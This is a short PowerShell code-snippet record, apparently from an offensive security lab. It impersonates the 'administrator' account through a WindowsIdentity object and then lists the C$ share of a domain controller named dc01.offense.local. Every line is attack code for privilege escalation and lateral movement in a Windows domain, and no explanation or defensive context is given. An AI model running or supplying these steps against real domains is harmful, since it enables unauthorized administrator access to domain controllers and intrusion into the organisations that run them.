---
id: 958aafcd-1728-4b43-88ff-317613abcdf4
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:07.747748+00:00'
updated_at: '2023-04-10T20:26:26.680404+00:00'
---

# Code Snippet 958aafcd

**Language**: ps1

```ps1
PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
PS> $idToImpersonate.Impersonate()
PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
PS> ls \\dc01.offense.local\c$
```
